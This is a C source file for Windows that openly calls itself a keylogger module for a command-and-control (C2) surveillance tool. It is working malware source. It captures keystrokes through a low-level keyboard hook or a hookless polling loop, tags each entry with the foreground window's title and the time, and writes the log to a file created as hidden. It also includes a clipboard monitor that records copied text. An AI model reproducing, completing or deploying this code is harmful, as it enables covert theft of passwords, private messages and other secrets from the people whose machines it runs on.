/*
 * Keylogger - Keyboard capture
 * C2 surveillance capability
 */

#include <windows.h>

// ============================================================================
// GLOBALS
// ============================================================================

static HHOOK g_hook = 0;
static HANDLE g_file = 0;
static HWND g_wnd = 0;
static char g_buf[4096];
static int g_pos = 0;

// ============================================================================
// VK TO STRING
// ============================================================================

char* vk2str(DWORD vk, BOOL shift)
{
    static char buf[32];

    switch(vk) {
        case 0x0D: return "[RET]";
        case 0x08: return "[BS]";
        case 0x09: return "[TAB]";
        case 0x1B: return "[ESC]";
        case 0x20: return " ";
        case 0x2E: return "[DEL]";
        case 0x25: return "[L]";
        case 0x27: return "[R]";
        case 0x26: return "[U]";
        case 0x28: return "[D]";
        case 0x14: return "[CAP]";
        case 0x10: case 0xA0: case 0xA1: return "";
        case 0x11: case 0xA2: case 0xA3: return "";
        case 0x12: return "";
    }

    if(vk >= 'A' && vk <= 'Z') {
        BOOL caps = GetKeyState(0x14) & 1;
        char c = (char)vk;
        if(!(shift ^ caps)) c += 32;
        buf[0] = c;
        buf[1] = 0;
        return buf;
    }

    if(vk >= '0' && vk <= '9') {
        if(shift) {
            static char sh[] = ")!@#$%^&*(";
            buf[0] = sh[vk - '0'];
        } else {
            buf[0] = (char)vk;
        }
        buf[1] = 0;
        return buf;
    }

    switch(vk) {
        case 0xBA: return shift ? ":" : ";";
        case 0xBB: return shift ? "+" : "=";
        case 0xBC: return shift ? "<" : ",";
        case 0xBD: return shift ? "_" : "-";
        case 0xBE: return shift ? ">" : ".";
        case 0xBF: return shift ? "?" : "/";
        case 0xC0: return shift ? "~" : "`";
        case 0xDB: return shift ? "{" : "[";
        case 0xDC: return shift ? "|" : "\\";
        case 0xDD: return shift ? "}" : "]";
        case 0xDE: return shift ? "\"" : "'";
    }

    if(vk >= 0x70 && vk <= 0x7B) {
        wsprintfA(buf, "[F%d]", vk - 0x6F);
        return buf;
    }

    wsprintfA(buf, "[%02X]", vk);
    return buf;
}

// ============================================================================
// HOOK CALLBACK
// ============================================================================

LRESULT CALLBACK kb_proc(int code, WPARAM wp, LPARAM lp)
{
    if(code == 0 && (wp == 0x100 || wp == 0x104)) {  // WM_KEYDOWN, WM_SYSKEYDOWN
        KBDLLHOOKSTRUCT* kb = (KBDLLHOOKSTRUCT*)lp;

        HWND wnd = GetForegroundWindow();
        if(wnd != g_wnd) {
            g_wnd = wnd;
            char title[256];
            GetWindowTextA(wnd, title, 256);

            SYSTEMTIME st;
            GetLocalTime(&st);

            g_pos += wsprintfA(g_buf + g_pos, "\n\n[%02d:%02d:%02d] %s\n",
                st.wHour, st.wMinute, st.wSecond, title);
        }

        BOOL shift = GetAsyncKeyState(0x10) & 0x8000;
        char* key = vk2str(kb->vkCode, shift);

        if(key[0]) {
            g_pos += wsprintfA(g_buf + g_pos, "%s", key);
        }

        if(g_pos > 3000 && g_file) {
            DWORD wr;
            WriteFile(g_file, g_buf, g_pos, &wr, 0);
            g_pos = 0;
        }
    }

    return CallNextHookEx(g_hook, code, wp, lp);
}

// ============================================================================
// START/STOP
// ============================================================================

BOOL kl_start(char* path)
{
    if(path) {
        g_file = CreateFileA(path, 0x40000000, 1, 0, 2, 2, 0);  // HIDDEN
    }

    g_hook = SetWindowsHookExA(13, kb_proc, GetModuleHandleA(0), 0);  // WH_KEYBOARD_LL
    return g_hook != 0;
}

void kl_stop(void)
{
    if(g_hook) {
        UnhookWindowsHookEx(g_hook);
        g_hook = 0;
    }

    if(g_file) {
        if(g_pos > 0) {
            DWORD wr;
            WriteFile(g_file, g_buf, g_pos, &wr, 0);
        }
        CloseHandle(g_file);
        g_file = 0;
    }
}

char* kl_get(int* len)
{
    *len = g_pos;
    return g_buf;
}

void kl_flush(void)
{
    if(g_file && g_pos > 0) {
        DWORD wr;
        WriteFile(g_file, g_buf, g_pos, &wr, 0);
        g_pos = 0;
    }
}

// ============================================================================
// POLLING KEYLOGGER - No hook required
// ============================================================================

static volatile BOOL g_poll = 0;
static HANDLE g_poll_thread = 0;

DWORD WINAPI poll_thread(LPVOID p)
{
    char* path = (char*)p;
    HANDLE hF = CreateFileA(path, 0x40000000, 1, 0, 2, 2, 0);

    BYTE last[256] = {0};
    char buf[4096];
    int pos = 0;

    while(g_poll) {
        for(int vk = 1; vk < 256; vk++) {
            SHORT st = GetAsyncKeyState(vk);

            if((st & 0x8000) && !(last[vk] & 0x80)) {
                BOOL shift = GetAsyncKeyState(0x10) & 0x8000;
                char* key = vk2str(vk, shift);

                if(key[0]) {
                    pos += wsprintfA(buf + pos, "%s", key);
                }

                if(pos > 3000 && hF) {
                    DWORD wr;
                    WriteFile(hF, buf, pos, &wr, 0);
                    pos = 0;
                }
            }

            last[vk] = (st & 0x8000) ? 0x80 : 0;
        }
        Sleep(10);
    }

    if(hF) {
        if(pos > 0) {
            DWORD wr;
            WriteFile(hF, buf, pos, &wr, 0);
        }
        CloseHandle(hF);
    }

    return 0;
}

BOOL kl_poll_start(char* path)
{
    g_poll = 1;
    g_poll_thread = CreateThread(0, 0, poll_thread, path, 0, 0);
    return g_poll_thread != 0;
}

void kl_poll_stop(void)
{
    g_poll = 0;
    if(g_poll_thread) {
        WaitForSingleObject(g_poll_thread, 2000);
        CloseHandle(g_poll_thread);
        g_poll_thread = 0;
    }
}

// ============================================================================
// CLIPBOARD MONITOR
// ============================================================================

static char g_clip[4096] = {0};

BOOL clip_check(void)
{
    if(!IsClipboardFormatAvailable(1))  // CF_TEXT
        return 0;

    if(!OpenClipboard(0))
        return 0;

    HANDLE h = GetClipboardData(1);
    if(h) {
        char* txt = (char*)GlobalLock(h);
        if(txt) {
            if(lstrcmpA(txt, g_clip) != 0) {
                lstrcpynA(g_clip, txt, 4095);
                GlobalUnlock(h);
                CloseClipboard();
                return 1;
            }
            GlobalUnlock(h);
        }
    }

    CloseClipboard();
    return 0;
}

char* clip_get(void)
{
    return g_clip;
}

// ============================================================================
// MESSAGE PUMP - Required for hook
// ============================================================================

void kl_pump(DWORD ms)
{
    MSG msg;
    DWORD start = GetTickCount();

    while(GetTickCount() - start < ms) {
        while(PeekMessageA(&msg, 0, 0, 0, 1)) {  // PM_REMOVE
            TranslateMessage(&msg);
            DispatchMessageA(&msg);
        }
        Sleep(10);
    }
}

// ============================================================================
// EOF
// ============================================================================
